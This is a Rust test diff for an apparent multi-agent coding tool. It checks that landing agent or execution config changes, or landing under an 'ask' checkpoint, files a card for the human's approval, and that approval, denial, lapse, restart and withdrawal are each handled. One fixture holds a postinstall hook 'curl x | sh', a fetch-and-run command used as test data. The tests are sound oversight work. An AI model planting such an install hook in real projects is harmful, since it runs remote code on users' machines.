@@ -15,7 +15,7 @@ use super::*;
 use crate::hive::fuses::{Fuses, FUSES_FILE};
 use crate::hive::paths::HivePaths;
 use crate::hive::record::{Hive, HiveFolder, KIND_GIT, LANDING_INTEGRATION};
-use crate::hive::rpc::{Front, HiveWindow, Outcome, Sent};
+use crate::hive::rpc::{Front, HiveRequest, HiveWindow, Outcome, Sent};
 use crate::hive::tools::{Caller, Ctx};
 use crate::hive::worker::{self, Review, Verdict, WorkerRecord, WorkerReport};
 use crate::hive::ROLE_COORDINATOR;
@@ -49,6 +49,9 @@ struct Seen {
     verbs: Vec<(String, Value)>,
     delivered: Vec<(String, String)>,
     busy: bool,
+    filed: Vec<HiveRequest>,
+    settled: Vec<(String, bool, String)>,
+    withdrawn: Vec<String>,
 }
 
 #[derive(Clone)]
@@ -72,6 +75,18 @@ impl HiveWindow for Stub {
     }
     fn agent_busy(&self, _tab: &str) -> bool {
         self.0.lock().unwrap().busy
+    }
+    fn file_request(&self, req: HiveRequest) -> Result<String, String> {
+        let mut seen = self.0.lock().unwrap();
+        let id = req.keep.clone().map_or_else(|| format!("r_{}", seen.filed.len() + 1), |(id, _)| id);
+        seen.filed.push(req);
+        Ok(id)
+    }
+    fn settle_request(&self, id: &str, ok: bool, outcome: String) {
+        self.0.lock().unwrap().settled.push((id.to_string(), ok, outcome));
+    }
+    fn withdraw_request(&self, id: &str, _why: &str) {
+        self.0.lock().unwrap().withdrawn.push(id.to_string());
     }
 }
 
@@ -234,6 +249,18 @@ impl Rig {
 
     fn log(&self) -> Vec<log::LandLogEntry> {
         log::read(&self.caller.paths)
+    }
+
+    /// The latest card filed, as the human's answer to it would carry it.
+    fn last_card(&self) -> (HiveRequest, approval::Decision) {
+        let req = self.seen.lock().unwrap().filed.last().cloned().expect("a card was filed");
+        let id = req.keep.clone().map_or_else(|| format!("r_{}", self.seen.lock().unwrap().filed.len()), |(id, _)| id);
+        let d = approval::Decision { id, kind: req.kind.to_string(), args: req.args.clone(), by: "desktop".into() };
+        (req, d)
+    }
+
+    fn told(&self) -> Vec<String> {
+        self.seen.lock().unwrap().delivered.iter().filter(|(t, _)| t == "coord").map(|(_, s)| s.clone()).collect()
     }
 
     /// Nothing a land holds is left: no lock file, no temporary worktree, no land folder.
@@ -510,23 +537,13 @@ async fn refusals_before_anything_is_written() {
 }
 
 #[tokio::test]
-async fn the_humans_approval_is_refused_for_now_and_a_detached_base_has_nowhere_to_land() {
-    for (tag, edit, says) in [
-        ("integration", Box::new(|h: &mut Hive| h.landing_mode = LANDING_INTEGRATION.into()) as Box<dyn Fn(&mut Hive)>, "human's approval"),
-        ("ask", Box::new(|h: &mut Hive| {
-            h.checkpoints.insert("landing".into(), "ask".into());
-        }), "human's approval"),
-        ("detached", Box::new(|h: &mut Hive| h.folders[0].base = None), "detached HEAD"),
-    ] {
-        let rig = Rig::with(tag, &["web"], |h| edit(h));
-        if tag == "integration" {
-            git(rig.repo("web"), &["branch", "hive/ship", "main"]);
-        }
-        // A detached Base still gets a worktree (off HEAD); the land is what refuses it.
-        let w = rig.reported("x", &["web"], "x.rs", "x\n");
-        let e = rig.land(&w).await.unwrap_err();
-        assert!(e.contains(says), "{tag}: {e}");
-    }
+async fn a_detached_base_has_nowhere_to_land() {
+    let rig = Rig::with("detached", &["web"], |h| h.folders[0].base = None);
+    // A detached Base still gets a worktree (off HEAD); the land is what refuses it.
+    let w = rig.reported("x", &["web"], "x.rs", "x\n");
+    let e = rig.land(&w).await.unwrap_err();
+    assert!(e.contains("detached HEAD"), "{e}");
+    assert!(rig.seen.lock().unwrap().filed.is_empty(), "nothing put to the human");
 }
 
 #[tokio::test]
@@ -1091,4 +1108,350 @@ fn a_cards_line_says_what_the_land_waits_on() {
     assert_eq!(saved.extra.get("y"), Some(&json!(2)));
     assert_eq!(driver::land_resource("Web App"), "land:web-app");
     assert!(crate::hive::queue::valid_resource(&driver::land_resource("Ünïcode Folder/x")));
+    l.state = STATE_AWAITING_HUMAN.into();
+    l.request = Some("r_9".into());
+    assert_eq!(describe(&l), "waiting for the human's approval");
+    assert_eq!(LandView::of(&l).request.as_deref(), Some("r_9"), "the worker's column finds its card");
+}
+
+// ── The human's approval (plan 6d) ──
+
+#[tokio::test]
+async fn agent_config_files_one_card_and_its_approval_lands_the_stored_tested_commit() {
+    let rig = Rig::new("config-card", &["web"]);
+    git(rig.repo("web"), &["checkout", "-q", "--detach"]);
+    let w = rig.reported("hook", &["web"], ".claude/settings.json", "{\"hooks\":{}}\n");
+    let before = rig.main_tip("web");
+    let out = rig.land(&w).await.unwrap();
+    assert_eq!(out["state"], STATE_AWAITING_HUMAN, "{out}");
+    assert!(out["result"].as_str().unwrap().contains("`.claude/settings.json`"), "{out}");
+    assert_eq!(rig.main_tip("web"), before, "nothing landed");
+    rig.assert_no_leftovers();
+    let r = rig.record(&w.task_id);
+    assert_eq!(r.phase, worker::PHASE_LANDING);
+    let land = r.land.clone().unwrap();
+    assert_eq!((land.approval.as_deref(), land.request.as_deref()), (Some("config"), Some("r_1")));
+    assert!(land.repos[0].status == REPO_TESTED && land.repos[0].tested.is_some() && land.repos[0].base_before.is_some(), "its step 1 stands");
+    assert!(!in_flight(&r) && held(&r), "it holds no lock while it waits");
+
+    let (req, d) = rig.last_card();
+    assert_eq!((req.tab_id.as_str(), req.kind, req.reason.as_deref()), ("coord", "hive_land", Some("Ship it.")));
+    assert_eq!(req.summary, "Land “Title hook” into main in web");
+    assert!(req.effects.iter().any(|e| e == "Changes agent or execution config in web: `.claude/settings.json`."), "{:?}", req.effects);
+    assert!(req.effects.iter().any(|e| e.starts_with("web: 1 file changed, 1 insertion(+), at the reviewed commit")), "{:?}", req.effects);
+    assert!(req.effects.iter().any(|e| e.contains("No reviewer looked at it")), "{:?}", req.effects);
+    assert_eq!((req.args["land_id"].as_str(), req.args["task_id"].as_str()), (Some(land.id.as_str()), Some(w.task_id.as_str())));
+    assert_eq!(req.args["repos"]["web"]["pinned"], land.repos[0].pinned.as_str());
+    assert!(rig.land(&w).await.unwrap_err().contains("waits for the human's approval"), "a waiting land isn't started twice");
+
+    // Base unmoved: step 2 takes the stored tested commit, step 1 isn't run again. A stand-in
+    // commit put there proves it.
+    let tested = land.repos[0].tested.clone().unwrap();
+    let stand_in = git(rig.repo("web"), &["commit-tree", &format!("{tested}^{{tree}}"), "-p", &tested, "-m", "stand-in"]);
+    let mut rec = rig.record(&w.task_id);
+    rec.land.as_mut().unwrap().repos[0].tested = Some(stand_in.clone());
+    worker::write_worker(&rig.caller.paths.task(&w.task_id), &rec).unwrap();
+    let v = approval::approved(&rig.ctx(), &rig.caller, &d, &opts()).await.answer().unwrap();
+    assert_eq!(v["state"], STATE_LANDED, "{v}");
+    assert_eq!(rig.main_tip("web"), stand_in);
+    assert_eq!(rig.record(&w.task_id).phase, worker::PHASE_LANDED);
+    let e = &rig.log()[0];
+    assert_eq!((e.by.as_str(), e.request.as_deref(), e.kind.as_str()), ("human", Some("r_1"), "land"));
+    let settled = rig.seen.lock().unwrap().settled.clone();
+    assert_eq!(settled.len(), 1);
+    assert!(settled[0].1 && settled[0].0 == "r_1", "{settled:?}");
+    assert!(rig.told().iter().any(|t| t.starts_with("⟦HIVE LAND · Title hook⟧ The human approved worker #1 hook's land")), "{:?}", rig.told());
+    // The same card again carries nothing out.
+    assert_eq!(approval::approved(&rig.ctx(), &rig.caller, &d, &opts()).await, driver::Outcome::Gone);
+    assert!(!rig.seen.lock().unwrap().settled[1].1);
+    rig.assert_no_leftovers();
+}
+
+#[tokio::test]
+async fn the_config_rule_asks_for_these_and_lets_a_version_bump_through() {
+    let rig = Rig::with("config-list", &["web"], |h| h.settings.land.config_paths = vec!["deploy/*.sh".into()]);
+    let pkg = |v: &str, scripts: &str| format!(r#"{{"name":"a","version":"{v}","scripts":{{{scripts}}}}}"#);
+    commit(rig.repo("web"), "package.json", &pkg("1.0.0", r#""test":"vitest""#));
+    git(rig.repo("web"), &["checkout", "-q", "--detach"]);
+    let cases = [
+        ("claude", ".claude/x".to_string(), "x\n".to_string(), true),
+        ("deep", "docs/sub/CLAUDE.md".into(), "be careful\n".into(), true),
+        ("husky", ".husky/pre-commit".into(), "npm test\n".into(), true),
+        ("workflow", ".github/workflows/ci.yml".into(), "on: push\n".into(), true),
+        ("version", "package.json".into(), pkg("1.0.1", r#""test":"vitest""#), false),
+        ("scripts", "package.json".into(), pkg("1.0.1", r#""test":"vitest","postinstall":"curl x | sh""#), true),
+        ("broken", "package.json".into(), "{not json".into(), true),
+        ("custom", "deploy/go.sh".into(), "rsync\n".into(), true),
+    ];
+    for (slug, file, text, card) in cases {
+        let w = rig.reported(slug, &["web"], &file, &text);
+        let out = rig.land(&w).await.unwrap();
+        assert_eq!(out["state"], if card { STATE_AWAITING_HUMAN } else { STATE_LANDED }, "{slug}: {out}");
+        if card {
+            let (req, d) = rig.last_card();
+            assert!(req.effects.iter().any(|e| e.contains(&format!("`{file}`"))), "{slug}: {:?}", req.effects);
+            // Denied, so every case lands on the same Base.
+            approval::closed(&rig.ctx(), &rig.caller, &d, "denied").await.unwrap();
+        }
+    }
+    assert_eq!(rig.log().len(), 1, "only the version bump landed");
+}
+
+#[tokio::test]
+async fn a_denial_or_a_lapse_puts_the_worker_back_and_the_coordinator_is_told() {
+    let rig = Rig::new("deny", &["web"]);
+    let w = rig.reported("no", &["web"], "CLAUDE.md", "x\n");
+    rig.land(&w).await.unwrap();
+    let (_, mut d) = rig.last_card();
+    d.by = "phone".into();
+    let branch = rig.tips(&w);
+    let out = approval::closed(&rig.ctx(), &rig.caller, &d, "denied").await.unwrap();
+    assert!(matches!(out, driver::Outcome::Refused(_)), "{out:?}");
+    let r = rig.record(&w.task_id);
+    assert_eq!(r.phase, worker::PHASE_REPORTED);
+    assert!(r.land.is_none());
+    assert_eq!(rig.tips(&w), branch, "its branch as it was");
+    assert!(rig.told().last().unwrap().contains("The human denied it from their phone."), "{:?}", rig.told());
+    let noted = rig.seen.lock().unwrap().verbs.iter().any(|(v, a)| v == crate::hive::rpc::VERB_TASK && a["note"].as_str().is_some_and(|n| n.contains("Land refused: The human denied it")));
+    assert!(noted, "the task gets a note");
+    assert!(approval::closed(&rig.ctx(), &rig.caller, &d, "denied").await.is_none(), "once");
+    assert_eq!(approval::approved(&rig.ctx(), &rig.caller, &d, &opts()).await, driver::Outcome::Gone, "nor approved after");
+
+    let w2 = rig.reported("late", &["web"], "AGENTS.md", "x\n");
+    rig.land(&w2).await.unwrap();
+    let (_, d2) = rig.last_card();
+    approval::closed(&rig.ctx(), &rig.caller, &d2, "expired").await.unwrap();
+    assert_eq!(rig.record(&w2.task_id).phase, worker::PHASE_REPORTED);
+    assert!(rig.told().last().unwrap().contains("didn't answer its card within 24 hours, so it lapsed"), "{:?}", rig.told());
+    assert!(rig.log().is_empty());
+    rig.assert_no_leftovers();
+}
+
+#[tokio::test]
+async fn an_approval_after_base_moved_merges_again_and_a_changed_config_change_asks_again() {
+    let rig = Rig::new("moved-card", &["web"]);
+    let w = rig.reported("env", &["web"], ".envrc", "export A=1\n\n\n\nexport END=1\n");
+    assert_eq!(rig.land(&w).await.unwrap()["state"], STATE_AWAITING_HUMAN);
+    let (_, d) = rig.last_card();
+    // Base moves under unrelated files: the config change is the one approved, so it lands.
+    commit(rig.repo("web"), "unrelated.txt", "u\n");
+    let v = approval::approved(&rig.ctx(), &rig.caller, &d, &opts()).await.answer().unwrap();
+    assert_eq!(v["state"], STATE_LANDED, "{v}");
+    assert_eq!(v["repos"][0]["merged_base"], true, "step 1 ran again on the new Base");
+    assert!(rig.repo("web").join("unrelated.txt").exists() && rig.repo("web").join(".envrc").exists());
+
+    // Base changes the config file itself after the card: what lands isn't what was approved.
+    let w2 = rig.reported("env2", &["web"], ".envrc", "export A=2\n\n\n\nexport END=1\n");
+    assert_eq!(rig.land(&w2).await.unwrap()["state"], STATE_AWAITING_HUMAN);
+    let (_, d2) = rig.last_card();
+    let base = rig.main_tip("web");
+    commit(rig.repo("web"), ".envrc", "export A=1\n\n\n\nexport END=2\n");
+    let out = approval::approved(&rig.ctx(), &rig.caller, &d2, &opts()).await;
+    assert!(matches!(out, driver::Outcome::Awaiting(_)), "{out:?}");
+    assert_ne!(rig.main_tip("web"), base, "the human's commit, nothing more");
+    let settled = rig.seen.lock().unwrap().settled.last().cloned().unwrap();
+    assert!(!settled.1 && settled.2.contains("no longer the one you approved"), "{settled:?}");
+    let (_, d3) = rig.last_card();
+    assert_ne!(d3.id, d2.id, "a new card");
+    rig.assert_no_leftovers();
+    let v = approval::approved(&rig.ctx(), &rig.caller, &d3, &opts()).await.answer().unwrap();
+    assert_eq!(v["state"], STATE_LANDED, "{v}");
+    assert_eq!(fs::read_to_string(rig.repo("web").join(".envrc")).unwrap(), "export A=2\n\n\n\nexport END=2\n");
+}
+
+#[tokio::test]
+async fn landing_ask_files_the_card_before_step_1() {
+    let rig = Rig::with("ask", &["web"], |h| {
+        h.checkpoints.insert("landing".into(), "ask".into());
+    });
+    let w = rig.reported("asked", &["web"], "a.rs", "a\n");
+    let out = rig.land(&w).await.unwrap();
+    assert_eq!(out["state"], STATE_AWAITING_HUMAN, "{out}");
+    let land = rig.record(&w.task_id).land.unwrap();
+    assert_eq!(land.approval.as_deref(), Some("ask"));
+    assert!(land.repos[0].tested.is_none(), "no step 1 before the human answers");
+    rig.assert_no_leftovers();
+    let (req, d) = rig.last_card();
+    assert!(req.effects.iter().any(|e| e.contains("Landing checkpoint for this Hive is Ask me")), "{:?}", req.effects);
+    assert!(!req.effects.iter().any(|e| e.contains("execution config")), "{:?}", req.effects);
+    let v = approval::approved(&rig.ctx(), &rig.caller, &d, &opts()).await.answer().unwrap();
+    assert_eq!(v["state"], STATE_LANDED, "{v}");
+    assert_eq!(rig.log()[0].by, "human");
+    assert_eq!(rig.seen.lock().unwrap().filed.len(), 1, "an approved land isn't asked about again");
+    rig.assert_no_leftovers();
+}
+
+#[tokio::test]
+async fn integration_mode_merges_exactly_the_approved_sha_no_ff_though_the_branch_moved_on() {
+    let rig = Rig::with("integration", &["web"], |h| h.landing_mode = LANDING_INTEGRATION.into());
+    let repo = rig.repo("web").to_path_buf();
+    // The coordinator's read copy holds hive/ship, as the Hive's layout makes it.
+    let rc = rig.caller.paths.coordinator_worktree("web");
+    fs::create_dir_all(rc.parent().unwrap()).unwrap();
+    git(&repo, &["worktree", "add", "-q", "-b", "hive/ship", rc.to_str().unwrap(), "main"]);
+    let main0 = rig.main_tip("web");
+    let w = rig.reported("feat", &["web"], "feat.rs", "f\n");
+    assert_eq!(w.folders[0].target.as_deref(), Some("hive/ship"));
+    let pinned = rig.tips(&w)["web"].as_str().unwrap().to_string();
+    let out = rig.land(&w).await.unwrap();
+    assert_eq!(out["state"], STATE_AWAITING_HUMAN, "{out}");
+    rig.assert_no_leftovers();
+    let (req, d) = rig.last_card();
+    assert_eq!(req.args["why"], "integration");
+    assert_eq!(req.summary, "Land “Title feat” into hive/ship in web");
+    assert!(req.effects[0].contains("lands into hive/ship only with your approval"), "{:?}", req.effects);
+    assert!(req.effects[0].contains("web has no land check") && !req.effects[0].contains("runs its land check"), "never a check it doesn't have: {:?}", req.effects);
+
+    // The worker commits on after the card.
+    let wt = PathBuf::from(w.folders[0].worktree.clone().unwrap());
+    let newer = commit(&wt, "more.rs", "m\n");
+    let v = approval::approved(&rig.ctx(), &rig.caller, &d, &opts()).await.answer().unwrap();
+    assert_eq!(v["state"], STATE_LANDED, "{v}");
+    let tip = git(&repo, &["rev-parse", "refs/heads/hive/ship"]);
+    let parents: Vec<String> = git(&repo, &["rev-list", "--parents", "-n1", &tip]).split_whitespace().map(str::to_string).collect();
+    assert_eq!(parents, vec![tip.clone(), main0.clone(), pinned.clone()], "a --no-ff merge of exactly the pin");
+    assert!(git(&repo, &["log", "-1", "--format=%s", &tip]).starts_with(&format!("Land Title feat ({}) [maiTerm L-", &pinned[..7])));
+    assert_eq!(rig.main_tip("web"), main0, "Base untouched");
+    assert_eq!(git(&rc, &["rev-parse", "HEAD"]), tip, "the read copy on hive/ship moved with it");
+    assert_eq!(git(&rc, &["symbolic-ref", "HEAD"]), "refs/heads/hive/ship", "and stays on its branch");
+    let r = rig.record(&w.task_id);
+    assert_eq!(r.phase, worker::PHASE_REPORTED, "not retired: its newer commit needs a land of its own");
+    assert_eq!(rig.tips(&w)["web"], newer.as_str(), "its branch isn't moved");
+    assert!(v["result"].as_str().unwrap().contains("moved since you named them"), "{v}");
+    let e = &rig.log()[0];
+    assert_eq!((e.kind.as_str(), e.target.as_str(), e.by.as_str()), ("integration", "hive/ship", "human"));
+    assert_eq!((e.merge_commit.as_deref(), e.reviewed_sha.as_str()), (Some(tip.as_str()), pinned.as_str()));
+    rig.assert_no_leftovers();
+}
+
+#[tokio::test]
+async fn a_waiting_card_is_filed_again_after_a_restart_under_its_id_and_deadline() {
+    let rig = Rig::new("refile", &["web"]);
+    let w = rig.reported("again", &["web"], ".mcp.json", "{}\n");
+    rig.land(&w).await.unwrap();
+    let (first, d) = rig.last_card();
+    let at = rig.record(&w.task_id).land.unwrap().request_at;
+    assert!(at > 0);
+    assert_eq!(approval::refile_in(&rig.ctx().window, &rig.caller), 1);
+    let (again, d2) = rig.last_card();
+    assert_eq!(again.keep, Some((d.id.clone(), at)));
+    assert_eq!((&again.args, &again.summary, &again.effects, &again.tab_id), (&first.args, &first.summary, &first.effects, &first.tab_id));
+    let v = approval::approved(&rig.ctx(), &rig.caller, &d2, &opts()).await.answer().unwrap();
+    assert_eq!(v["state"], STATE_LANDED, "{v}");
+    assert_eq!(approval::refile_in(&rig.ctx().window, &rig.caller), 0, "nothing waits now");
+}
+
+#[tokio::test]
+async fn a_worker_stopped_while_its_card_waits_withdraws_the_card() {
+    let rig = Rig::new("withdraw", &["web"]);
+    let w = rig.reported("halt", &["web"], ".githooks/pre-push", "exit 0\n");
+    rig.land(&w).await.unwrap();
+    let (_, d) = rig.last_card();
+    crate::hive::control::stop_worker(&rig.ctx(), &rig.caller, &json!({ "worker": "halt", "reason": "later" })).await.unwrap();
+    assert_eq!(rig.seen.lock().unwrap().withdrawn, vec!["r_1".to_string()]);
+    assert_eq!(approval::approved(&rig.ctx(), &rig.caller, &d, &opts()).await, driver::Outcome::Gone);
+    let settled = rig.seen.lock().unwrap().settled.clone();
+    assert!(!settled[0].1 && settled[0].2.contains("is stopped now"), "{settled:?}");
+    assert_eq!(rig.record(&w.task_id).phase, worker::PHASE_STOPPED);
+}
+
+#[tokio::test]
+async fn a_partly_landed_land_whose_card_goes_with_a_new_report_keeps_what_landed() {
+    let rig = Rig::new("partial-card", &["web", "api"]);
+    commit(rig.repo("api"), ".envrc", "export A=1\n\n\n\nexport END=1\n");
+    let w = rig.reported("split", &["web", "api"], ".envrc", "export A=2\n\n\n\nexport END=1\n");
+    let pins = rig.tips(&w);
+    assert_eq!(rig.land(&w).await.unwrap()["state"], STATE_AWAITING_HUMAN);
+    let (_, d) = rig.last_card();
+    // Approved; web lands, then Base changes api's config file under its step 2, so the merged
+    // change isn't the approved one and a second card asks with web already landed.
+    let api = rig.repo("api").to_path_buf();
+    let mut o = opts();
+    o.before_advance = Some(Arc::new(move |f: &str| {
+        if f == "api" {
+            commit(&api, ".envrc", "export A=1\n\n\n\nexport END=2\n");
+        }
+    }));
+    let out = approval::approved(&rig.ctx(), &rig.caller, &d, &o).await;
+    assert!(matches!(out, driver::Outcome::Awaiting(_)), "{out:?}");
+    let land = rig.record(&w.task_id).land.unwrap();
+    assert_eq!((land.state.as_str(), land.landed().len()), (STATE_AWAITING_HUMAN, 1), "{land:?}");
+    let web1 = rig.main_tip("web");
+
+    // The worker reports again with a new api commit: the card goes, and the land holds as a
+    // denial would have left it, so what landed stays landed.
+    let api_wt = PathBuf::from(w.folders.iter().find(|f| f.name == "api").unwrap().worktree.clone().unwrap());
+    let new_api = commit(&api_wt, "more.rs", "m\n");
+    let mut rec = rig.record(&w.task_id);
+    rec.tab_id = Some("wtab".into());
+    worker::write_worker(&rig.caller.paths.task(&w.task_id), &rec).unwrap();
+    let mut as_worker = rig.caller.clone();
+    as_worker.tab_id = "wtab".into();
+    crate::hive::report::report(&rig.ctx(), &as_worker, &json!({ "status": "done", "summary": "more", "receipts": { "commits": [new_api] } }))
+        .await
+        .unwrap();
+    assert_eq!(rig.seen.lock().unwrap().withdrawn, vec!["r_2".to_string()]);
+    let r = rig.record(&w.task_id);
+    assert_eq!(r.phase, worker::PHASE_REPORTED);
+    let held_land = r.land.clone().unwrap();
+    assert!(held_land.is_held() && held_land.held_reason.as_deref().unwrap().starts_with("Landed web; its card for the rest was withdrawn"), "{held_land:?}");
+
+    let mut wrong = rig.tips(&w);
+    wrong["web"] = json!(new_api);
+    let e = rig.land_with(&w, json!({ "commits": wrong }), opts()).await.unwrap_err();
+    assert!(e.contains("already landed web at"), "{e}");
+    // api's new commit still changes .envrc: a new card for it alone, in the same land.
+    assert_eq!(rig.land(&w).await.unwrap()["state"], STATE_AWAITING_HUMAN);
+    let (req, d) = rig.last_card();
+    assert_eq!(req.args["land_id"], land.id.as_str(), "the same land");
+    assert!(req.args["repos"].get("web").is_none() && req.effects.iter().any(|e| e == "Already landed: web."), "{:?}", req.effects);
+    let v = approval::approved(&rig.ctx(), &rig.caller, &d, &opts()).await.answer().unwrap();
+    assert_eq!(v["state"], STATE_LANDED, "{v}");
+    assert_eq!(rig.main_tip("web"), web1, "web isn't landed twice");
+    let log = rig.log();
+    let landed: Vec<(&str, &str)> = log.iter().map(|e| (e.folder.as_str(), e.reviewed_sha.as_str())).collect();
+    assert_eq!(landed, vec![("web", pins["web"].as_str().unwrap()), ("api", new_api.as_str())]);
+    assert!(log.iter().all(|e| e.land == land.id), "one land");
+    rig.assert_no_leftovers();
+}
+
+#[tokio::test]
+async fn integration_mode_logs_no_merge_commit_for_a_pin_the_branch_already_has_and_says_which_repos_go_unchecked() {
+    let rig = Rig::with("integration-noop", &["web", "api"], |h| {
+        h.landing_mode = LANDING_INTEGRATION.into();
+        h.folders[0].land_check = Some("true".into());
+    });
+    for name in ["web", "api"] {
+        let rc = rig.caller.paths.coordinator_worktree(name);
+        fs::create_dir_all(rc.parent().unwrap()).unwrap();
+        git(rig.repo(name), &["worktree", "add", "-q", "-b", "hive/ship", rc.to_str().unwrap(), "main"]);
+    }
+    let ship = |name: &str| git(rig.repo(name), &["rev-parse", "refs/heads/hive/ship"]);
+    let checked = || Opts { checker: Arc::new(ShChecker::default()), ..opts() };
+
+    // An earlier land into api: its merge commit is hive/ship's tip there.
+    let a = rig.reported("first", &["api"], "a.rs", "a\n");
+    rig.land(&a).await.unwrap();
+    let (req, d) = rig.last_card();
+    assert!(req.effects[0].ends_with("--no-ff. api has no land check, so nothing tests the merge there before it lands."), "{:?}", req.effects);
+    assert_eq!(approval::approved(&rig.ctx(), &rig.caller, &d, &opts()).await.answer().unwrap()["state"], STATE_LANDED);
+    let m_prev = ship("api");
+
+    // A worker in web and api that committed only in web: its api pin is hive/ship's tip.
+    let b = rig.reported("second", &["web", "api"], "b.rs", "b\n");
+    let b_api = PathBuf::from(b.folders.iter().find(|f| f.name == "api").unwrap().worktree.clone().unwrap());
+    git(&b_api, &["reset", "-q", "--hard", "HEAD~1"]);
+    assert_eq!(rig.tips(&b)["api"], m_prev.as_str());
+    rig.land_with(&b, json!({}), checked()).await.unwrap();
+    let (req, d) = rig.last_card();
+    assert!(req.effects[0].contains("api has no land check, so nothing tests the merge there before it lands. The land check runs first in web."), "{:?}", req.effects);
+    assert!(req.effects.iter().any(|e| e.starts_with("api: no file changes")), "{:?}", req.effects);
+    assert_eq!(approval::approved(&rig.ctx(), &rig.caller, &d, &checked()).await.answer().unwrap()["state"], STATE_LANDED);
+    assert_eq!(ship("api"), m_prev, "nothing merged in api");
+    let log = rig.log();
+    let api_line = log.iter().find(|e| e.task_id == b.task_id && e.folder == "api").unwrap();
+    assert_eq!(api_line.merge_commit, None, "the earlier land's merge commit isn't this land's");
+    let web_line = log.iter().find(|e| e.task_id == b.task_id && e.folder == "web").unwrap();
+    assert_eq!(web_line.merge_commit.as_deref(), Some(ship("web").as_str()));
+    rig.assert_no_leftovers();
 }
